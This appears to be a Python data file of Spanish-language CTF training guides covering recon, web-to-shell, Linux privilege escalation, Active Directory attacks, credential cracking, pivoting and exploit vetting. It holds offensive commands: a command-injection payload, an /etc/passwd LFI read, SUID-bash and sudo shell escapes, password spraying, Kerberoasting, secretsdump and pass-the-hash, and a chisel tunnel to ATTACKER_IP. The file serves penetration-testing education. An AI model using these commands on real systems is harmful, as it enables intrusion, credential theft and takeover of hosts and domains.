# Step-by-step learning guides for the "Aprender" mode of the web app.
# Prose-first: each step explains the idea (why), what to look for, and how to
# decide the next move. Commands are the same ones the practice mode adapts.
# "section" links a guide to its practice section (slug) for the "ver comandos" jump.
# Exported into web/data/content.json under "guides" by export_web_content.py.

GUIDES = [
    {
        "id": "metodologia",
        "title": "Como enfrentar una room",
        "phase": "recon",
        "section": "mapa-de-decisiones",
        "summary": "El mapa mental para no ir a ciegas: de la IP a root como una cadena de fases.",
        "steps": [
            {
                "title": "Entiende que es una cadena, no un truco",
                "idea": "Una room casi nunca se resuelve con un solo comando magico. Es una cadena: reconocimiento, enumeracion, acceso inicial y escalada de privilegios. Cada fase te da informacion que desbloquea la siguiente. La mayoria de atascos vienen de saltarte una fase o de no anotar lo que ya encontraste.",
                "commands": ["mkdir -p nmap web loot creds notes"],
                "look": "Una carpeta de trabajo por room y la IP fijada arriba en la app, para que los comandos se autocompleten con tu objetivo.",
                "decide": "Si no sabes por donde empezar, la respuesta siempre es recon. Nunca arranques lanzando exploits al azar.",
            },
            {
                "title": "Reconoce: que hay expuesto",
                "idea": "El objetivo es saber que servicios corren y en que version. No puedes atacar lo que no sabes que existe. Primero descubres puertos abiertos (rapido y amplio) y despues miras versiones y scripts solo en los que esten abiertos, para no hacer ruido innecesario.",
                "commands": [
                    "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
                    "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
                ],
                "look": "Puertos abiertos y, sobre todo, versiones. Un servicio con version concreta es tu primera pista para buscar CVEs o formas de enumerar.",
                "decide": "Web (80/443) -> enumeracion web. SMB (445) -> enum de shares/usuarios. 88/389 -> es un dominio, piensa en Active Directory.",
            },
            {
                "title": "Enumera: convierte servicios en pistas",
                "idea": "Enumerar es exprimir cada servicio hasta encontrar la puerta. Aqui se gana o se pierde la room. La clave es interpretar: cada respuesta te dice algo. Un share legible, un endpoint de API, un usuario valido... son piezas que encajaras luego.",
                "commands": [
                    "whatweb $URL",
                    "nxc smb $IP -u '' -p '' --shares",
                ],
                "look": "Nombres de usuario, rutas ocultas, ficheros de configuracion, versiones de software, mensajes de error que revelen tecnologia.",
                "decide": "Si encuentras credenciales -> pruebalas en todos los servicios. Si encuentras una version vulnerable -> valida el CVE antes de explotar.",
            },
            {
                "title": "Accede, estabiliza y escala",
                "idea": "Con una entrada (shell o login), lo primero es estabilizar y orientarte: quien eres y que permisos tienes. La escalada sigue la misma logica de siempre: buscar algo que un usuario mas privilegiado ejecuta, lee o confia, y que tu puedes tocar.",
                "commands": [
                    "whoami; id; hostname",
                    "sudo -l",
                ],
                "look": "Tu usuario, tus grupos, permisos sudo, tareas programadas, binarios con permisos raros, credenciales reutilizables.",
                "decide": "Cada credencial nueva -> reenumera todo desde el principio con ella. Root/SYSTEM -> recoge flags y anota el root cause (por que funciono).",
            },
        ],
    },
    {
        "id": "recon-paso-a-paso",
        "title": "Reconocimiento: de puertos a superficie",
        "phase": "recon",
        "section": "recon-y-servicios",
        "summary": "Por que se escanea asi y que hacer con cada tipo de servicio que aparece.",
        "steps": [
            {
                "title": "Primero todos los puertos, rapido",
                "idea": "Escaneas los 65535 puertos sin scripts primero porque es rapido y no quieres asumir que un servicio esta en su puerto tipico (muchos labs los mueven). -Pn evita que nmap descarte el host si no responde al ping, algo comun en maquinas filtradas.",
                "commands": ["nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt"],
                "look": "La lista de puertos abiertos. Ignora de momento las versiones; solo quieres saber donde mirar.",
                "decide": "Con la lista de puertos, lanza el segundo escaneo SOLO sobre esos puertos. Escanear versiones de los 65535 es lento e inutil.",
            },
            {
                "title": "Ahora versiones y scripts, solo donde hace falta",
                "idea": "-sV detecta la version exacta del servicio y -sC lanza los scripts por defecto de nmap, que a menudo ya revelan cosas (titulos web, shares anonimos, certificados con hostnames). La version es oro: te dice que buscar en searchsploit.",
                "commands": ["nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt"],
                "look": "Versiones concretas, hostnames en certificados, banners, y cualquier cosa que los scripts saquen gratis.",
                "decide": "Anota los hostnames que veas y anadelos a /etc/hosts; muchos vhosts solo responden por nombre, no por IP.",
            },
            {
                "title": "Enumera cada servicio por su naturaleza",
                "idea": "Cada servicio se enumera distinto. No memorices comandos sueltos: asocia puerto a objetivo. Web = rutas y parametros. SMB = shares y usuarios. DNS = transferencia de zona. La app tiene el bloque de comandos por servicio en Recon; usalo como chuleta.",
                "commands": [
                    "whatweb $URL",
                    "nxc smb $IP -u '' -p '' --shares",
                    "snmpwalk -v2c -c public $IP",
                ],
                "look": "Cualquier acceso sin credenciales (anonimo/guest), ficheros expuestos, o listados que revelen nombres de usuario reales.",
                "decide": "Si un servicio permite acceso anonimo, entra y saquea antes de buscar exploits. Lo facil primero.",
            },
        ],
    },
    {
        "id": "web-a-shell",
        "title": "De la web a una shell",
        "phase": "access",
        "section": "web-y-apis",
        "summary": "Como pasar de una pagina web a ejecutar comandos, razonando cada paso.",
        "steps": [
            {
                "title": "Fingerprint y descubrimiento",
                "idea": "Antes de buscar bugs, entiende que es la web: que tecnologia usa y que rutas existen. El fuzzing de directorios/ficheros revela paneles, backups, APIs o codigo fuente que no estan enlazados. Mide siempre una ruta que no exista para saber que responde el servidor y filtrar el ruido.",
                "commands": [
                    "whatweb $URL",
                    "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak -fc 404",
                ],
                "look": "Rutas interesantes: /admin, /api, /backup, .git, ficheros .bak o de config. Y la tecnologia (PHP, Node, Python) que condiciona los bugs probables.",
                "decide": "Ves /api o /v1 -> fuzzea endpoints y metodos HTTP. Ves .git -> vuelca el repo. Ves un login -> prueba defaults y SQLi.",
            },
            {
                "title": "Encuentra la entrada (parametros y metodos)",
                "idea": "Los bugs viven en la entrada de datos: parametros GET/POST, cabeceras, campos JSON de una API. Un mismo endpoint puede ser inofensivo con GET y inyectable con PUT o POST. Por eso se fuzzea tambien el metodo HTTP, no solo la ruta.",
                "commands": [
                    "for m in GET POST PUT DELETE PATCH; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
                    "arjun -u \"$URL/page.php\"",
                ],
                "look": "Parametros que cambian la respuesta, metodos que devuelven codigos distintos, mensajes de error de base de datos o de plantilla.",
                "decide": "Error SQL -> SQLi. {{7*7}} da 49 -> SSTI. Un parametro file/page -> prueba LFI. La respuesta refleja tu input -> XSS o SSTI.",
            },
            {
                "title": "Confirma la vulnerabilidad antes de explotar",
                "idea": "Confirmar evita perder horas con falsos positivos. Manda una prueba minima e inocua: para command injection, un id; para SQLi, una comilla o un OR 1=1; para LFI, /etc/passwd. Confirmar tambien te dice el contexto (usuario, SO) que necesitas para el siguiente paso.",
                "commands": [
                    "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
                    "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
                ],
                "look": "El contenido de /etc/passwd, la salida de id, un retraso si usaste sleep. Eso confirma que controlas algo del servidor.",
                "decide": "Confirmado -> escala a lectura de codigo/config o a ejecucion. No confirmado -> vuelve al paso anterior, prueba otro parametro o metodo.",
            },
            {
                "title": "Convierte en shell y estabiliza",
                "idea": "Con ejecucion de comandos, lanzas una reverse shell hacia tu maquina. La shell inicial es 'tonta' (sin Ctrl+C, sin autocompletado); estabilizarla a una TTY completa te ahorra errores y te deja trabajar comodo. Usa el generador de reverse shell de la app con tu IP de atacante.",
                "commands": [
                    "nc -lvnp 4444",
                    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                ],
                "look": "La conexion entrante en tu listener y un prompt usable tras estabilizar (export TERM=xterm y stty raw -echo; fg).",
                "decide": "Shell estable -> empieza la enumeracion de privesc (whoami/id, sudo -l). Guarda como conseguiste la shell para el writeup.",
            },
        ],
    },
    {
        "id": "privesc-linux",
        "title": "Escalar a root en Linux",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "La mentalidad de la escalada y como pasar de enumerar a explotar.",
        "steps": [
            {
                "title": "La regla de oro",
                "idea": "Toda la escalada se resume en una idea: si puedes modificar, leer o influir en algo que un usuario mas privilegiado ejecuta o confia, tienes un vector. Un script que corre root y tu puedes editar, un binario SUID, una tarea cron con ruta escribible... todo es la misma logica.",
                "commands": ["whoami; id; groups; hostname; pwd"],
                "look": "Tu usuario, tus grupos (docker/lxd/adm son interesantes) y donde estas. Es tu punto de partida.",
                "decide": "Grupo docker o lxd -> escape casi directo. Usuario normal -> sigue con la enumeracion sistematica.",
            },
            {
                "title": "Enumera de forma sistematica",
                "idea": "No adivines: recorre siempre los mismos vectores en orden. Empieza por lo que da resultados rapidos (sudo -l, SUID) y baja a lo mas laborioso (cron, configs). Un script como linpeas automatiza esto, pero entender que busca cada comando te hace mejor.",
                "commands": [
                    "sudo -l",
                    "find / -perm -4000 -type f 2>/dev/null",
                    "getcap -r / 2>/dev/null",
                ],
                "look": "Permisos sudo (sobre todo NOPASSWD), binarios SUID que no sean del sistema, capabilities como cap_setuid.",
                "decide": "Cualquier binario que salga -> buscalo en GTFOBins. Si esta ahi, tienes la receta exacta para abusar de el.",
            },
            {
                "title": "Explota el vector, no solo lo enumeres",
                "idea": "Encontrar el vector es la mitad; hay que ejecutarlo. GTFOBins te da la linea concreta para cada binario. La idea comun es forzar que ese proceso privilegiado te de una shell o te copie/edite algo como root (por ejemplo, poner el bit SUID a bash).",
                "commands": [
                    "sudo find . -exec /bin/sh \\; -quit",
                    "cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
                ],
                "look": "Un prompt de root (# en vez de $) o un id que devuelve uid=0. Eso es el objetivo.",
                "decide": "Root -> recoge la flag de root y documenta el vector exacto. No funciona -> vuelve a la lista y prueba el siguiente vector, no te obsesiones con uno.",
            },
            {
                "title": "Loot y credenciales",
                "idea": "Aunque no seas root todavia, buscar credenciales en disco suele desbloquear la room: configs con contrasenas, historiales, claves SSH, backups. Muchas rooms se escalan reutilizando una password encontrada, no con un exploit.",
                "commands": [
                    "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
                    "grep -riE 'password|passwd|secret' /var/www /home /opt 2>/dev/null | head",
                ],
                "look": "Contrasenas en texto claro, claves privadas, ficheros .env, historiales de bash con comandos que incluyan credenciales.",
                "decide": "Credencial encontrada -> pruebala con su usuario (su/ssh) y reenumera sudo -l como ese usuario. El camino a root suele ser en cadena.",
            },
        ],
    },
    {
        "id": "active-directory",
        "title": "Active Directory desde cero",
        "phase": "access",
        "section": "active-directory",
        "summary": "El enfoque cambia: no explotas una maquina, transformas identidad en permisos.",
        "steps": [
            {
                "title": "Prepara el terreno: nombres y hora",
                "idea": "AD funciona sobre nombres, no IPs. Kerberos falla si el hostname/dominio no resuelven o si tu reloj esta desincronizado con el DC. Antes de nada, identifica el dominio y el DC y anadelos a /etc/hosts. Sin esto, herramientas como impacket fallan con errores confusos.",
                "commands": [
                    "nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,636,3268,5985 $IP",
                    "echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts",
                ],
                "look": "El nombre del dominio y del DC (los scripts de nmap y el rid-brute los revelan), y el puerto 88 (Kerberos) confirmando que es un DC.",
                "decide": "Error de clock skew -> sincroniza tu hora con el DC (ntpdate/faketime). Ya con nombres -> empieza a enumerar usuarios.",
            },
            {
                "title": "Consigue el primer punto de apoyo",
                "idea": "En AD todo empieza con un usuario valido, aunque sea sin password. Puedes sacar la lista de usuarios sin credenciales (RID brute, enum anonimo) y luego probar spraying controlado: una password candidata contra muchos usuarios. Cuidado: el spraying agresivo bloquea cuentas.",
                "commands": [
                    "nxc smb $IP -u 'guest' -p '' --rid-brute | tee rid.txt",
                    "nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success",
                ],
                "look": "Usuarios validos (nombre confirmado), o el patron usuario=password que muchos labs usan. Un [+] en netexec es una credencial buena.",
                "decide": "Credencial valida -> reenumera shares/LDAP/WinRM con ella. Sin credencial pero con usuarios -> prueba AS-REP roasting.",
            },
            {
                "title": "Kerberos: tickets crackeables",
                "idea": "Kerberos regala hashes crackeables offline. AS-REP roasting saca hashes de usuarios sin preauth (no necesitas password). Kerberoasting saca hashes de cuentas de servicio (SPN) si ya tienes una credencial. Los crackeas con hashcat y a menudo son la via a un usuario mas fuerte.",
                "commands": [
                    "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP",
                    "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request",
                    "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
                ],
                "look": "Hashes que empiezan por $krb5asrep$ (AS-REP) o $krb5tgs$ (Kerberoast). Si crackean, tienes credenciales nuevas.",
                "decide": "Hash crackeado -> nueva credencial, vuelve a enumerar. Nada crackea -> pasa a BloodHound para buscar rutas por permisos.",
            },
            {
                "title": "BloodHound y camino a Domain Admin",
                "idea": "Con una credencial, BloodHound mapea el dominio y te muestra la ruta mas corta a Domain Admin abusando de permisos (GenericAll, WriteDACL, sesiones). Cuando encuentras la cuenta objetivo, extraes sus hashes (secretsdump/DCSync) y te autenticas con Pass-the-Hash sin saber la password.",
                "commands": [
                    "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip",
                    "impacket-secretsdump $DOMAIN/$USER:$PASS@$IP",
                    "evil-winrm -i $IP -u administrator -H <NTLM>",
                ],
                "look": "En BloodHound: aristas de ACL peligrosas hacia grupos privilegiados. En secretsdump: el hash NTLM de administrator/krbtgt.",
                "decide": "Ruta clara en BloodHound -> abusa del permiso concreto. Hash de admin -> Pass-the-Hash con evil-winrm/psexec y recoge la flag.",
            },
        ],
    },
    {
        "id": "credenciales",
        "title": "Tengo credenciales, y ahora que",
        "phase": "access",
        "section": "credenciales-y-loot",
        "summary": "Buscar, identificar, crackear y reutilizar sin caos.",
        "steps": [
            {
                "title": "Sabe donde mirar",
                "idea": "Las credenciales no aparecen solas: viven en sitios predecibles. Ficheros de configuracion de la web, historiales de shell, claves SSH en homes, backups, y en Windows en configs de IIS o el gestor de credenciales. Buscar sistematicamente ahorra mas rooms que cualquier exploit.",
                "commands": [
                    "grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head",
                    "find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null",
                ],
                "look": "Contrasenas en texto claro, claves privadas, ficheros .env, vaults de KeePass, tokens de API.",
                "decide": "Password en claro -> pruebala ya en todos los servicios. Fichero protegido (zip/kdbx/ssh) -> conviertelo a hash y crackea.",
            },
            {
                "title": "Identifica el hash antes de crackear",
                "idea": "Crackear con el modo equivocado no funciona nunca. Primero identifica el tipo de hash: la longitud y el formato dan pistas, y herramientas como hashid o name-that-hash te dan el modo de hashcat. Los ficheros con contrasena se convierten a hash con los *2john.",
                "commands": [
                    "hashid 'HASH'",
                    "ssh2john id_rsa > id_rsa.hash",
                    "keepass2john vault.kdbx > keepass.hash",
                ],
                "look": "El tipo de hash (NTLM, bcrypt, MD5, krb5...) y su numero de modo en hashcat (-m) o el formato en john.",
                "decide": "Ya con el modo correcto -> a crackear. Si es un hash de red (NetNTLM) capturado, ese si merece Responder/relay, no solo crack.",
            },
            {
                "title": "Crackea con criterio",
                "idea": "Empieza siempre por rockyou: la mayoria de rooms usan passwords de ese diccionario. Si no cae, aplica reglas (best64) antes de saltar a fuerza bruta. hashcat usa GPU (rapido), john es comodo para formatos raros. No pierdas horas en fuerza bruta pura en un CTF.",
                "commands": [
                    "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
                    "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                    "john --show hash.txt",
                ],
                "look": "La password en claro cuando cae. Si no cae en minutos con rockyou, probablemente el vector no era crackear.",
                "decide": "Crackeada -> reutiliza. No cae -> revisa si el hash era el objetivo real o si te falta contexto (salt, formato).",
            },
            {
                "title": "Reutiliza en todo",
                "idea": "El error mas comun es encontrar una credencial y probarla en un solo sitio. En CTF y en real, el password reuse es la norma: la misma clave suele valer para SSH, SMB, WinRM, un panel web o una base de datos. Cada credencial nueva reinicia tu enumeracion.",
                "commands": [
                    "nxc smb $IP -u $USER -p $PASS",
                    "nxc winrm $IP -u $USER -p $PASS",
                    "ssh $USER@$IP",
                ],
                "look": "Un [+] en netexec (SMB/WinRM), un login SSH que entra, o acceso a un panel. Fijate en 'Pwn3d!' que indica ejecucion.",
                "decide": "Funciona en un servicio nuevo -> entra y vuelve a enumerar desde ahi. Anota cada credencial con su fuente y donde la probaste.",
            },
        ],
    },
    {
        "id": "pivoting",
        "title": "Pivoting: llegar a la red interna",
        "phase": "pivot",
        "section": "pivoting",
        "summary": "Cuando la maquina comprometida ve servicios que tu Kali no alcanza.",
        "steps": [
            {
                "title": "Entiende por que necesitas pivotar",
                "idea": "Has comprometido una maquina que tiene una segunda tarjeta de red o ve hosts internos que tu Kali no puede tocar directamente. El pivot es esa maquina: la usaras como puente para alcanzar la red interna. Primero confirma que existe esa red que tu no ves.",
                "commands": [
                    "ip a",
                    "ip route",
                    "arp -a",
                ],
                "look": "Interfaces o rutas hacia rangos que tu Kali no tiene (ej. 10.10.20.0/24), y hosts en la tabla ARP que no aparecian en tu escaneo inicial.",
                "decide": "Ves una red interna nueva -> monta un tunel. No ves nada nuevo -> quiza no hay pivoting en esta room.",
            },
            {
                "title": "Monta el tunel",
                "idea": "El tunel enruta tu trafico a traves del pivot. Si tienes SSH, ssh -D te da un SOCKS gratis. Si solo ejecutas binarios, chisel o ligolo-ng crean el tunel en reverse (el pivot conecta hacia ti, util cuando el firewall bloquea entrada). Ligolo es el mas comodo: te da una interfaz de red completa.",
                "commands": [
                    "ssh -D 1080 -N user@$IP",
                    "chisel server -p 8000 --reverse",
                    "./chisel client ATTACKER_IP:8000 R:socks",
                ],
                "look": "El mensaje de conexion establecida en tu servidor chisel/ligolo, o el puerto SOCKS local (1080) escuchando.",
                "decide": "SOCKS listo -> configura proxychains. Ligolo -> anade la ruta a la red interna con ip route add.",
            },
            {
                "title": "Usa el tunel para atacar dentro",
                "idea": "Con el tunel montado, cualquier herramienta puede alcanzar la red interna anteponiendo proxychains (que la rutea por el SOCKS). Ojo: por un SOCKS solo pasa TCP, asi que usa -sT en nmap, no SYN scan. Valida siempre con un curl/nc antes de lanzar escaneos ruidosos.",
                "commands": [
                    "proxychains nmap -sT -Pn -n -p80,445 10.10.20.5",
                    "proxychains crackmapexec smb 10.10.20.5 -u $USER -p $PASS",
                ],
                "look": "Servicios internos respondiendo a traves del proxy: webs, SMB, otro DC. Es como empezar una room nueva dentro de la red.",
                "decide": "Host interno accesible -> repite el ciclo recon/enum/acceso contra el. Documenta la cadena atacante -> pivot -> red interna.",
            },
        ],
    },
    {
        "id": "cve-metodologia",
        "title": "Usar exploits y CVEs con cabeza",
        "phase": "access",
        "section": "cve-y-exploits",
        "summary": "Aprovechar PoCs publicos sin ejecutar basura a ciegas ni romper la maquina.",
        "steps": [
            {
                "title": "Confirma producto y version exactos",
                "idea": "Un exploit solo sirve si coincide el producto Y el rango de version. Perder tiempo con un CVE que no aplica es el error clasico. Saca la version exacta de tu recon y busca; si la version esta fuera del rango vulnerable, descartalo o busca uno especifico para esa version.",
                "commands": [
                    "searchsploit PRODUCTO VERSION",
                    "searchsploit -m 12345",
                ],
                "look": "Coincidencia exacta de producto y version. Fijate si el exploit es pre-auth (sin login) o post-auth (necesita credencial).",
                "decide": "Coincide y es pre-auth -> prioridad alta. Requiere admin o version distinta -> baja prioridad, sigue enumerando.",
            },
            {
                "title": "Lee el exploit antes de ejecutarlo",
                "idea": "Nunca ejecutes un PoC de internet a ciegas: puede borrar datos, abrir puertos, o robar tu shell. Abrelo, entiende que hace, y busca comandos peligrosos. Cambia la IP/puerto a los tuyos y sustituye cualquier payload por algo inocuo (id, whoami) para la primera prueba.",
                "commands": [
                    "sed -n '1,80p' exploit.py",
                    "grep -nEi 'rm |curl|wget|socket|subprocess|system|eval' exploit.py",
                    "python3 exploit.py -h",
                ],
                "look": "Que variables hay que rellenar (LHOST, URL, credenciales), y cualquier accion destructiva o conexion externa sospechosa.",
                "decide": "Codigo limpio y entendido -> adaptalo y pruebalo. Codigo ofuscado o destructivo -> busca otro PoC o hazlo manual.",
            },
            {
                "title": "Reproduce minimo y escala",
                "idea": "Antes de lanzar el exploit completo, reproduce la peticion minima que dispara el bug (con curl o Burp) para confirmar que la maquina es vulnerable de verdad. Empieza con un comando inocuo; solo cuando confirmes ejecucion, cambias a la reverse shell.",
                "commands": [
                    "python3 exploit.py --check --url $URL",
                    "python3 exploit.py --url $URL --cmd 'id'",
                ],
                "look": "La salida de id/whoami que confirma ejecucion remota, o el indicador de 'vulnerable' del propio exploit.",
                "decide": "Confirmado con comando inocuo -> lanza la reverse shell hacia tu listener. Falla -> revisa version, ruta o requisitos de auth.",
            },
        ],
    },
]
